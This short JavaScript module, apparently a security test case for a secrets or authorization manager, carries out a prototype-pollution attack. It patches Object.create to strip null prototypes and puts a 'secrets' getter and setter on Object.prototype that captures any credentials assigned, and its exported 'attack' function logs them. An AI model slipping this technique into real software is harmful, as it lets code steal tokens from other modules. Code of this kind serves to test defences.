  /* {
    'www.google.com': {
      headers: {
        Authorization: 'Bearer ANY_SECRET'
      },
      method: 'GET'
    }
  } */


let stolen;

// Remove the functionality of accepting null prototype
const { create } = Object;
Object.create = (proto, props) => {
  return create(proto || {}, props);
};

Object.defineProperty(Object.prototype, "secrets", {
  get: () => stolen,
  set: (v) => {
    stolen = v;
  },
});

export const attack = (authzManager, success) => {
  if (stolen) {
    console.log(stolen);
  }
};
